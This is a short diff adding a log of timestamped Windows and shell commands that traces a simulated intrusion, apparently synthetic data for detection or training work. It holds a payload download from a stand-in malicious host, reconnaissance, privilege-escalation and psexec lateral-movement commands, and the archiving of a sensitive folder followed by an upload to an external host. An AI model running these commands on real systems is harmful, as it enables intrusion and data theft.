@@ -1,0 +1,12 @@
+2026-11-15T05:31:02.658327 | powershell Invoke-WebRequest http://malicious-site.com
+2026-11-15T05:31:02.658327 | curl http://malicious-site.com/payload.exe
+2026-11-15T05:36:02.658327 | whoami
+2026-11-15T05:36:02.658327 | net user
+2026-11-15T05:36:02.658327 | runas /user:administrator cmd
+2026-11-15T05:41:02.658327 | whoami /priv
+2026-11-15T05:41:02.658327 | net localgroup administrators
+2026-11-15T05:46:02.658327 | net use \\FILE-SRV01\share
+2026-11-15T05:46:02.658327 | wmic process call create cmd.exe
+2026-11-15T05:46:02.658327 | psexec \\FILE-SRV01 cmd
+2026-11-15T05:51:02.658327 | tar -czf data.tar.gz sensitive/
+2026-11-15T05:51:02.658327 | curl -X POST https://external-host/upload
